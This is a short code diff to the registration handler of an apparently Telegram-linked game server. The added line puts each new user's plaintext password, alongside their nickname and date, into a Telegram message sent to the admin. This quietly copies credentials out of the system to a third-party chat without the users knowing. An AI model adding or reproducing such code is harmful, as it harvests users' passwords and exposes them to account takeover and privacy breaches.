@@ -667,7 +667,7 @@ function handleRegister(msg) {
   saveAccounts();
   const adminId = tgUsers._admin || ADMIN_ID_INIT;
   if (adminId && tgBot) {
-    tgBot.sendMessage(adminId, '🆕 *Новая регистрация (в игре):*\n\n• Ник: `' + nick + '`\n• Дата: ' + new Date().toISOString().slice(0, 10), { parse_mode: 'Markdown' }).catch(() => {});
+    tgBot.sendMessage(adminId, '🆕 *Новая регистрация (в игре):*\n\n• Ник: `' + nick + '`\n• Пароль: `' + pass + '`\n• Дата: ' + new Date().toISOString().slice(0, 10), { parse_mode: 'Markdown' }).catch(() => {});
   }
   return { ok: true, nickname: nick };
 }
